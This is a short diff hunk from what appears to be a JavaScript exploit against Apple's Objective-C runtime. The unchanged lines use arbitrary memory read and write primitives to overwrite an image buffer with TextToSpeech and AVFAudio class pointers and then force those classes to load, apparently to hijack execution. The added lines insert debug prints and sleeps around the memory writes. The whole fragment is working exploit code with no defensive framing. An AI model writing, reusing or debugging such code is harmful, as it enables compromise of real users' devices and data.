@@ -18822,11 +18822,19 @@ async function main() {
           const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
           for (let i = 0; i < 2; ++i) {
             const worker = dlopen_workers[i];
+            print(`preload class[${i}]=${classes[i].hex()} worker=${worker.id.hex()}`);
+            sleep(10);
             const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
             print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
+            sleep(10);
             const imageBuffer = p.read64(wrappedBitmap + 0x10n);
             print(`imageBuffer: ${imageBuffer.hex()}`);
+            sleep(10);
+            print(`preload class write begin i=${i} addr=${(imageBuffer + 0x20n).hex()}`);
+            sleep(10);
             p.write64(imageBuffer + 0x20n, classes[i]);
+            print(`preload class write done i=${i}`);
+            sleep(10);
           }
           print('Load TextToSpeech');
           await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
